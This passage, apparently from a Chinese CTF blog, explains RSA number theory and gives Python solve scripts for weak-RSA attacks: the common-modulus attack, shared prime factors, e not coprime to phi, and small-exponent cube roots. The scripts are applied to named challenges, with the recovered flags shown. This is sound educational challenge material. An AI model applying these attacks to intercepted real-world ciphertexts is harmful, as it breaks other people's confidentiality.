<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span>  libnum <span class="keyword">import</span> invmod</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">print</span> invmod(<span class="number">47</span>,<span class="number">30</span>)</span><br><span class="line"><span class="keyword">print</span> gmpy2.invert(<span class="number">47</span>,<span class="number">30</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535852949.7.png" alt></p>
</li>
</ul>
</li>
<li><p>欧几里得算法：就是求最大公约数，<code>gcd(a,b)==gcd(b,a%b),(b!=0)</code> 和 <code>gcd(a,0)==a</code>有递归实现和迭代实现两种：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 递归版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> a <span class="keyword">if</span> <span class="keyword">not</span> b <span class="keyword">else</span> gcd(b, a % b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 迭代版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd2</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>
</li>
<li><p>扩展欧几里得算法：本质上就是将欧几里得算法求最大公约数的过程最后转化为线性表达式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 递归版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ext_euclid</span> <span class="params">( a , b )</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x1 , y1 , q = ext_euclid( b , a % b ) <span class="comment"># q = GCD(a, b) = GCD(b, a%b)</span></span><br><span class="line">        x , y = y1, ( x1 - (a // b) * y1 )</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"><span class="comment"># 迭代版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>, a)</span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    s1, s2 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    r, q = a % b, a / b</span><br><span class="line">    <span class="keyword">while</span> r:</span><br><span class="line">        m, n = x, y</span><br><span class="line">        x = s1 - x * q</span><br><span class="line">        y = s2 - y * q</span><br><span class="line">        s1, s2 = m, n</span><br><span class="line">        a, b = b, r</span><br><span class="line">        r, q = a % b, a / b</span><br><span class="line">    <span class="keyword">return</span> (x, y, b)</span><br></pre></td></tr></table></figure>
</li>
<li><p>中国剩余定理，也叫孙子定理：用来求同于方程组（这里在数论中做题不复杂，一到代码是真的复杂）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535853531.62.png" alt></p>
<p>直接贴上大佬的代码：（解决了互质与不互质两种情况）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#不成立则不存在解</span></span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(解,最小公倍数)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="应用中一些函数、模块的支撑"><a href="#应用中一些函数、模块的支撑" class="headerlink" title="应用中一些函数、模块的支撑"></a>应用中一些函数、模块的支撑</h3><blockquote>
<p>这里不得不感慨python的强大与方便，提供了gmpy2库、libnum库、pycrypto模块等第三方库，避免了从底层一步一步的写代码（其实也是太菜了，这种基于数论的代码是真的写不出来）</p>
</blockquote>
<ul>
<li><p>gmpy2库、libnum库，主要提供各种数学运算的函数库，向求逆元，取模等运算直接调运函数就可以，很便捷</p>
</li>
<li><p>关于两个库的说明链接如下：</p>
</li>
</ul>
<ul>
<li>pycrypto模块是python中来处理加密解密等信息安全相关的一个重要模块，提供了对称加密、非对称加密、散列哈希的一些计算方法，满足我们在密码学应用上的使用，就RSA可以实现公私钥的提取，生成，利用公私钥进行加解密等，之前写过的一篇文章有介绍</li>
</ul>
<ul>
<li><p>关于RSA中n的分解：</p>
<p>有在线分解：[]:<a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a>  </p>
<p>离线的[yafu]:<a href="https://sourceforge.net/projects/yafu/" target="_blank" rel="noopener">https://sourceforge.net/projects/yafu/</a>   （p,q相差较大或较小时可快速分解）</p>
</li>
<li><p>除了用代码，还可以用OpenSSL对一些标准格式的RSA加解密</p>
<p>使用OpenSSL提取公钥信息：<code>openssl rsa -pubin -in (文件名) -text</code></p>
<p>使用OpenSSL提取私钥信息：<code>openssl rsa -in (文件名) -text</code></p>
<p>使用OpenSSL进行公钥加密：<code>openssl rsautl -encrypt -in test -out test.enc -inkey asn1pub.pem -pubin</code></p>
<p>使用OpenSSL进行私钥解密：<code>openssl rsautl -decrypt -in test.enc -out test.dec -inkey asn1enc.pem</code></p>
<p>使用OpenSSL进行私钥签名：<code>openssl rsautl -sign -in test -out test.sig-inkey asn1enc.pem</code></p>
<p>使用OpenSSL进行公钥验证：<code>openssl rsautl -verify -in test.sig -out test.vfy -inkey asn1pub.pem -pubin</code></p>
</li>
</ul>
<h3 id="一些实际的应用："><a href="#一些实际的应用：" class="headerlink" title="一些实际的应用："></a>一些实际的应用：</h3><ul>
<li><p>RSA直接解密：</p>
<p>若已知私钥d，则可以直接解密： <code>m=pow(c,d,n)</code> :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p:<span class="number">0x9a724c6747de9eadccd33f4d60ada91754b8be8c65590cafe66f69a2f4afbfd359e47ca6fd2dbde8948062dc116bc574f4313ab99b2bb6d8ae47beaa0c1ebeddL</span></span><br><span class="line"></span><br><span class="line">q:<span class="number">0x8c1c81cc005ce3dd6d684ebb88151dc0c53b1cef8a29b1cb8121860fb57d93117bf449aac4300dc6103ac6211c6f8ae68987d99aff0dd8967a4afa00f2116873L</span></span><br><span class="line"></span><br><span class="line">e:<span class="number">0x190a000845e9c8c2059242835432326369aaf8c7ca85e685bba968b386155a91f1f7ca1019ff23d119222e1f0dfdeb0915d2e97601ef94bf15ca6d9211e984e9038f263f4984355c397ed22d67c26da6d31acfc4d599c70cba80859bee099e5a2dc3ab23aecf58f73f44d07318f70985c623d9612efefb15bf8dab77d5d54e85L</span></span><br><span class="line"></span><br><span class="line">d:<span class="number">0x28b95b7e3159a851cbf537e007ae49864b7dbb93fc370a5L</span> </span><br><span class="line"></span><br><span class="line">c:<span class="number">0x23091e42fa7609c73f1941b320fad6d2ff6e47be588d1623f970f1fee7abd221c9834b208f3c888902fe87ca76ec1e1363757d93c6e25c49f1c61c72b141c0b8848b54a117427d8e30eeab89694eb5f849cafecb0e5361b9b2b0e3f89e0fdbcc66a6aad4a1a4a85d828083a01a5d569b7eeb6f9151794453382b524aa52993f9L</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c=<span class="number">0x23091e42fa7609c73f1941b320fad6d2ff6e47be588d1623f970f1fee7abd221c9834b208f3c888902fe87ca76ec1e1363757d93c6e25c49f1c61c72b141c0b8848b54a117427d8e30eeab89694eb5f849cafecb0e5361b9b2b0e3f89e0fdbcc66a6aad4a1a4a85d828083a01a5d569b7eeb6f9151794453382b524aa52993f9</span></span><br><span class="line">d=<span class="number">0x28b95b7e3159a851cbf537e007ae49864b7dbb93fc370a5</span></span><br><span class="line">n=<span class="number">0x9a724c6747de9eadccd33f4d60ada91754b8be8c65590cafe66f69a2f4afbfd359e47ca6fd2dbde8948062dc116bc574f4313ab99b2bb6d8ae47beaa0c1ebedd</span> * <span class="number">0x8c1c81cc005ce3dd6d684ebb88151dc0c53b1cef8a29b1cb8121860fb57d93117bf449aac4300dc6103ac6211c6f8ae68987d99aff0dd8967a4afa00f2116873</span></span><br><span class="line"></span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> hex(m)[<span class="number">2</span>:len(hex(m))<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
<p>若已知质数p和q，则通过依次计算欧拉函数、私钥d可解密。实现如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_decrypt</span><span class="params">(e, c, p, q)</span>:</span></span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = gmpy2.invert(e, phi) 	<span class="comment">#求e模phi的逆</span></span><br><span class="line">        <span class="keyword">return</span> pow(c, d, n)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"e and phi are not coprime!"</span></span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure>
<p>在选取加密指数e时要求phi，e互质，也就是<code>gcd(phi,e)==1</code> ，如果不满足是无法直接解密的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x**33=1926041757553905692219721422025224638913707 mod 3436415358139016629092568198745009225773259</span><br><span class="line">tell me the smallest answer of x</span><br><span class="line">n = 3436415358139016629092568198745009225773259=3881 · 885445853681787330351086884500131209939</span><br><span class="line">e = 33</span><br><span class="line">c = 1926041757553905692219721422025224638913707</span><br><span class="line">phi=(p-1)*(q-1)</span><br><span class="line">gcd(phi,33)==3 -&gt; e = 11</span><br><span class="line">n分解以后不满足互素的要求，先用逆元11得到x^3的值,然后爆破X</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c = <span class="number">1926041757553905692219721422025224638913707</span></span><br><span class="line">n = <span class="number">3436415358139016629092568198745009225773259</span></span><br><span class="line">e = <span class="number">33</span></span><br><span class="line">p = <span class="number">3881</span></span><br><span class="line">q = <span class="number">885445853681787330351086884500131209939</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = libnum.invmod(e/<span class="number">3</span>, phi)</span><br><span class="line"><span class="keyword">print</span> d</span><br><span class="line">x3 = pow(c, d, n)</span><br><span class="line"><span class="keyword">print</span> x3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(i)</span>:</span></span><br><span class="line">    x, b = gmpy2.iroot(x3 + i *n, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> x</span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100000000</span>):</span><br><span class="line">    calc(j)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535857638.43.png" alt></p>
</li>
<li><p>模不互质（<code>gcd(N1,N2)!=1</code>）适用情况：存在两个或更多模数，且<code>gcd(N1,N2)!=1</code> 多个模数n共用质数，则可以很容易利用欧几里得算法求得他们的质因数之一<code>gcd(N1,N2)</code> ，然后这个最大公约数可用于分解模数分别得到对应的p和q，即可进行解密。</p>
</li>
<li><p>共模攻击：适用情况：明文m、模数n相同，公钥指数e、密文c不同，gcd(e1,e2)==1 对同一明文的多次加密使用相同的模数和不同的公钥指数可能导致共模攻击。</p>
<p>python实现的证明代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">common_modulus</span><span class="params">(n, e1, e2, c1, c2)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    ref: https://crypto.stackexchange.com/questions/16283/how-to-use-common-modulus-attack</span></span><br><span class="line"><span class="string">    ∵gcd(e1,e2)==1,∴由扩展欧几里得算法，存在e1*s1+e2*s2==1</span></span><br><span class="line"><span class="string">    ∴m==m^1==m^(e1*s1+e2*s2)==((m^e1)^s1)*((m^e2)^s2)==(c1^s1)*(c2^s2)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">assert</span> (libnum.gcd(e1, e2) == <span class="number">1</span>)</span><br><span class="line">    _, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="comment"># 若s1&lt;0，则c1^s1==(c1^-1)^(-s1)，其中c1^-1为c1模n的逆元。</span></span><br><span class="line">    m = pow(c1, s1, n) <span class="keyword">if</span> s1 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c1, n), -s1, n)</span><br><span class="line">    m *= pow(c2, s2, n) <span class="keyword">if</span> s2 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c2, n), -s2, n)</span><br><span class="line">    <span class="keyword">return</span> m % n</span><br></pre></td></tr></table></figure>
<p>Xman-RSA(这道题利用了共模攻击和模不互素)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_to_num</span><span class="params">(b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(b.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_to_bytes</span><span class="params">(n)</span>:</span></span><br><span class="line">    b = hex(n)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">    b = <span class="string">'0'</span> + b <span class="keyword">if</span> len(b) % <span class="number">2</span> == <span class="number">1</span> <span class="keyword">else</span> b</span><br><span class="line">    <span class="keyword">return</span> b.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_a_prime</span><span class="params">(l)</span>:</span></span><br><span class="line">    random_seed = urandom(l)</span><br><span class="line"></span><br><span class="line">    num = bytes_to_num(random_seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> is_prime(num):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(s, e, n)</span>:</span></span><br><span class="line">    p = bytes_to_num(s)</span><br><span class="line">    p = pow(p, e, n)</span><br><span class="line">    <span class="keyword">return</span> num_to_bytes(p).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">separate</span><span class="params">(n)</span>:</span></span><br><span class="line">    p = n % <span class="number">4</span></span><br><span class="line">    t = (p * p) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> t == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'flag.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line"></span><br><span class="line">msg1 = <span class="string">""</span></span><br><span class="line">msg2 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">    <span class="keyword">if</span> separate(i):</span><br><span class="line">        msg2 += flag[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg1 += flag[i]</span><br><span class="line"></span><br><span class="line">p1 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p2 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p3 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n1 = p1 * p2</span><br><span class="line">n2 = p1 * p3</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">c1 = encrypt(msg1, e, n1)</span><br><span class="line">c2 = encrypt(msg2, e, n2)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line">p4 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p5 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n3 = p4 * p5</span><br><span class="line">c1 = num_to_bytes(pow(n1, e1, n3)).encode(<span class="string">'hex'</span>)</span><br><span class="line">c2 = num_to_bytes(pow(n1, e2, n3)).encode(<span class="string">'hex'</span>)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(num_to_bytes(n2)))</span><br><span class="line">print(base64.b64encode(num_to_bytes(n3)))</span><br></pre></td></tr></table></figure>
<p>n2，n3已知，利用共模攻击得到n1，由<code>gcd(n1,n2)==p1</code> 分解n1，n2得到flag：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fix_py</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># decode encryption.encrypted</span></span><br><span class="line">    s1 = <span class="string">'abdefghijklmpqrtuvwxyz'</span></span><br><span class="line">    s2 = <span class="string">'dmenwfoxgpyhirasbktclu'</span></span><br><span class="line">    f1 = open(<span class="string">'encryption.encrypted'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'encryption.py'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f2:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f1.readlines():</span><br><span class="line">            tmp = <span class="string">''</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">                tmp += s2[s1.index(j)] <span class="keyword">if</span> j <span class="keyword">in</span> s1 <span class="keyword">else</span> j</span><br><span class="line">            f2.write(tmp)</span><br><span class="line"><span class="comment"># fix_py()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">common_modulus</span><span class="params">(n, e1, e2, c1, c2)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (libnum.gcd(e1, e2) == <span class="number">1</span>)</span><br><span class="line">    _, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">    m = pow(c1, s1, n) <span class="keyword">if</span> s1 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c1, n), -s1, n)</span><br><span class="line">    m *= pow(c2, s2, n) <span class="keyword">if</span> s2 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c2, n), -s2, n)</span><br><span class="line">    m %= n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[n2, n3] = map(<span class="keyword">lambda</span> x: int(base64.b64decode(x).encode(<span class="string">'hex'</span>), <span class="number">16</span>),</span><br><span class="line">               open(<span class="string">'n2&amp;n3'</span>).readlines())</span><br><span class="line">[n1c1, n1c2] = map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), open(<span class="string">'n1.encrypted'</span>).readlines())</span><br><span class="line">[msg1c1, msg2c2] = map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), open(<span class="string">'ciphertext'</span>).readlines())</span><br><span class="line"><span class="comment"># 通过共模攻击得到n1</span></span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line">n1 = common_modulus(n3, e1, e2, n1c1, n1c2)</span><br><span class="line"><span class="comment"># n1,n2有一个共有质因数p1</span></span><br><span class="line"><span class="comment"># n1 += n3  # 存在n3比n1小的可能，并且确实如此;貌似主办方中途改题，把n1改成小于n3了。</span></span><br><span class="line">p1 = gmpy2.gcd(n1, n2)</span><br><span class="line"><span class="keyword">assert</span> (p1 != <span class="number">1</span>)</span><br><span class="line">p2 = n1 / p1</span><br><span class="line">p3 = n2 / p1</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">d1 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p2 - <span class="number">1</span>))</span><br><span class="line">d2 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p3 - <span class="number">1</span>))</span><br><span class="line">msg1 = pow(msg1c1, d1, n1)</span><br><span class="line">msg2 = pow(msg2c2, d2, n2)</span><br><span class="line">msg1 = hex(msg1)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line">msg2 = hex(msg2)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> msg1, msg2</span><br><span class="line"><span class="comment"># XA&#123;RP0I_0Itrsigi s.y</span></span><br><span class="line"><span class="comment"># MNCYT_55_neetnvmrap&#125;</span></span><br><span class="line"><span class="comment"># XMAN&#123;CRYPT0_I5_50_Interestingvim rsa.py&#125;</span></span><br></pre></td></tr></table></figure>
<p> RSA-CRYPTO(有两个公钥文件和两个flag文件。提取公钥对比，n相同且可解密，共模攻击)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./pubkey2.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">     key = RSA.importKey(f)</span><br><span class="line">     n = key.n</span><br><span class="line">     e = key.e</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (n)</span><br><span class="line"><span class="keyword">print</span> (e)</span><br><span class="line"><span class="comment">#提取两个公钥都是这个脚本</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535858774.6.png" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#共模攻击</span></span><br><span class="line">n =  <span class="number">0x8989a398988456b3fef4a6ad86df3c99577f8978048de5436befc30d8d8c94958912aa526ff333b66857306ebb8de36c2c396a84efdc5d382502daa1a3f3b6e97502d2e31c849330f5b4c95257a149a97f5954eaf89341147adcdd4e950fff74e30bbe622876b42eeac86df4ad9715d05b5604aa8179424c7d9ac46bd6b5f322b2b5728ba148704a25a8efcc1e7c84ea7e5ce3e01703f04f94a431d9954bd7ae2c7dd6e879b35f8a2d4a5efbe737257bf99bd9ee66b15aff233fc77b558a487da5952fbe2b923da9c5eb46788c050336b7e36a5ed82d5c1b2aeb0e45bee405cbe72481db2568aa829eeac87d201a5a8ff5ee6f0be38192ab2839635f6c664217L</span></span><br><span class="line">e1 = <span class="number">2333</span></span><br><span class="line">e2 = <span class="number">23333</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./flag1.enc'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher1 =  f.read()</span><br><span class="line">    cipher1 = b64decode(cipher1).encode(<span class="string">'hex'</span>)</span><br><span class="line">    cipher1 = string.atoi(cipher1,base = <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./flag2.enc'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher2 = f.read()</span><br><span class="line">    cipher2 = b64decode(cipher2).encode(<span class="string">'hex'</span>)</span><br><span class="line">    cipher2 = string.atoi(cipher2,base = <span class="number">16</span>)  <span class="comment">#将字符串转为整型数字,base 指定进制</span></span><br><span class="line"></span><br><span class="line">gcd, s, t = gmpy2.gcdext(e1, e2)        <span class="comment">#返回一个三元素的元组 g == gcd（a，b）和g == a * s + b * t</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    s = -s</span><br><span class="line">    cipher1 = gmpy2.invert(cipher1,n)   <span class="comment">#求cipher1模n的逆(求逆元)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    t = -t</span><br><span class="line">    cipher2 = gmpy2.invert(cipher2,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#powmod（x，y，m）返回（x ** y）mod m。指数y可以是负数，如果x mod m的逆存在，则返回正确的结果。否则，引发ValueError</span></span><br><span class="line">plain = gmpy2.powmod(cipher1, s, n) * gmpy2.powmod(cipher2, t, n) % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> long_to_bytes(plain)</span><br></pre></td></tr></table></figure>
</li>
<li><p>小明文攻击：适用情况：e较小，一般为3。公钥e很小，明文m也不大的话，于是<code>m^e=k*n+m</code> 中的的k值很小甚至为0，爆破k或直接开三次方即可。</p>
<p>Jarvis OJ Extremely hard RSA</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,binascii,libnum,time</span><br><span class="line">n=<span class="number">0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">res=<span class="number">0</span></span><br><span class="line">c=int(open(<span class="string">'extremelyhardRSA.rar/flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> time.asctime()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">200000000</span>):</span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(c+n*i,<span class="number">3</span>)[<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">        res=gmpy2.iroot(c+n*i,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> i,res</span><br><span class="line">        <span class="keyword">print</span> libnum.n2s(res)</span><br><span class="line">        <span class="keyword">print</span> time.asctime()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Rabin加密中的N可被分解:Rabin加密是RSA的衍生算法，e==2是Rabin加密典型特征,一般先通过其他方法分解得到p，q，然后解密.</p>
<p>python实现：</p>
